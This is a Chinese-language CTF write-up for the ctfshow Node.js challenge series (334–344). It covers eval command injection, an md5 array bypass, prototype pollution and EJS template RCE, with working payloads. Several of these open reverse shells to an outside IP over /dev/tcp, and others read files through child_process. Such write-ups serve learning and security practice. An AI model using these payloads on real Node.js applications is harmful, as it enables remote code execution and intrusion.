---

title: ctfshow nodejs
categories: ctfshow

---

﻿# 前言

文档先阅读一遍

[Node.js 教程 | 菜鸟教程 (runoob.com)](https://www.runoob.com/nodejs/nodejs-tutorial.html)

常见漏洞

[Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7184#toc-0)

[nodejs一些入门特性&&实战 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7752#toc-0)

原型链污染

[深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript)

模板引擎rce

[XNUCA2019 Hardjs题解 从原型链污染到RCE - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6113#toc-4)

[再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7025)

[几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)](https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/)

[ctfshow nodejs篇 - TARI TARI](https://tari.moe/2021/05/04/ctfshow-nodejs/)

<!--more-->

# 334
![](https://img-blog.csdnimg.cn/a12160dc630c4b9d895ffcbc1b98bf3d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

变大写操作

![](https://img-blog.csdnimg.cn/669a9ce6cb3a4006a6a95c078798130a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

传小写 ctfshow 123456即可

# 335-336-系统命令
```
Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。
在eval函数的参数中可以构造require('child_process').exec('');来进行调用。
```

![](https://img-blog.csdnimg.cn/b9c0dad4009e455b86acc87a20bfda94.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

发现返回的是 [object Object]

查看文档：

[child_process 子进程 | Node.js API 文档 (nodejs.cn)](http://nodejs.cn/api/child_process.html#child_processexeccommand-options-callback)

发现exec返回的是

![](https://img-blog.csdnimg.cn/bcd70f18cb2d471da1b7ce45f4a9b10a.png#pic_center)
通过查找所有可替换用法 `execSync` `spawnSync`

spawnSync():

![](https://img-blog.csdnimg.cn/8d4f301a8c344224ada47b1e3fcb106d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

Payload:
```
法一：系统命令
?eval=require('child_process').execSync('ls').toString();
?eval=require('child_process').spawnSync('cat',['fl00g.txt']).output;
?eval=require('child_process').spawnSync('cat',['fl00g.txt']).stdout;
?eval=global.process.mainModule.constructor._load('child_process').exec('ls');
```

```
法二：
文件操作
?eval=require('fs').readdirSync('.');
?eval=require('fs').readFileSync('fl001g.txt');
```

[Node.js 文件系统模块 (nodejs.cn)](http://nodejs.cn/learn/the-nodejs-fs-module)

![](https://img-blog.csdnimg.cn/128a8a59555a4938a35dd05c09984d0e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

```
法三 拼接
'+' 要urlencode一下
?eval=var a="require('child_process').ex";var b="ecSync('ls').toString();";eval(a%2Bb); 
?eval=require('child_process')['ex'%2B'ecSync']('cat f*')
```

# 367-md5
```js
var express = require('express');
var router = express.Router();
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }
  
});

module.exports = router;
```

数组绕过?a[]=1&b[]=1

# 368-原型链污染
```js
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
});
```

前面有一个copy函数，可以与链接文章里面的merge函数类比

污染 user 让secert.ctfshow为36dboy

Payload：
```
{"username":"1","password":"1","__proto__":{"ctfshow":"36dboy"}}
```

# 339
这里让输入flag所以没法直接利用了

![](https://img-blog.csdnimg.cn/f501b322306f4f748f837500092f6433.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

## 非预期
ejs rce

![](https://img-blog.csdnimg.cn/0213ae95e0d44608aef4934bec224708.png#pic_center)

Ejs引擎可以rce ，具体过程参考上面链接

Payload：
```
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/6666 0>&1\"');var __tmp2"}}
```
先污染一下 `outputFunctionName`

![](https://img-blog.csdnimg.cn/3d8531860ee9446984950bb6bd55477b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

访问一下调用渲染，反弹shell

![](https://img-blog.csdnimg.cn/2579f751f6ce46a5aea6904d6941960a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
## 预期解
![](https://img-blog.csdnimg.cn/30a7f61ce2ea49fe880d85e058c8ae53.png#pic_center)

污染query参数 再利用Function反弹shell

![](https://img-blog.csdnimg.cn/7d16a01eb0db4113a10b96eccdff01bf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_18,color_FFFFFF,t_70,g_se,x_16#pic_center)

污染点在user 触发点在query

/login下污染query

![](https://img-blog.csdnimg.cn/88f5229927f14d04a6670833c2047d32.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)/api下触发query

![](https://img-blog.csdnimg.cn/8f67e3c19e7044628d88aea697593b86.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

Payload：

```
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/150.158.181.145/2334 0>&1\"')"}}
```

# 340
触发点还是query
但是污染点不一样了

![](https://img-blog.csdnimg.cn/c2dd7c1ec8174d7f89b6bc2cbca79af8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_16,color_FFFFFF,t_70,g_se,x_16#pic_center)

user.userinfo向上污染两级才是Object对象

payload：
```
{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/150.158.181.145/2334 0>&1\"')"}}}
```

# 341
没了api 那就用ejs的rce

# 342-343
具体过程分析参考前言模板rce

payload:
```
{"__proto__":{"__proto__":{"type":"Code","self":1,"line":"global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/150.158.181.145/2333 0>&1\"')"}}}
```
`content-type要改为application/json`

# 344
```js
router.get('/', function(req, res, next) {
 res.type('html');
 var flag = 'flag_here';
 if(req.url.match(/8c|2c|\,/ig)){
 	res.end('where is flag :)');
 }
 var query = JSON.parse(req.query.query);
 if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
 	res.end(flag);
 }else{
 	res.end('where is flag. :)');
 }

});
```

即 url 中不能包含大小写 `8c、2c 和 逗号`

`nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析`

![](https://img-blog.csdnimg.cn/34b26e479ce54df79f007fba54123da8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

paylaod:

```
?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
```

引号url编码为%22与c形成%22c匹配正则，所以编码c

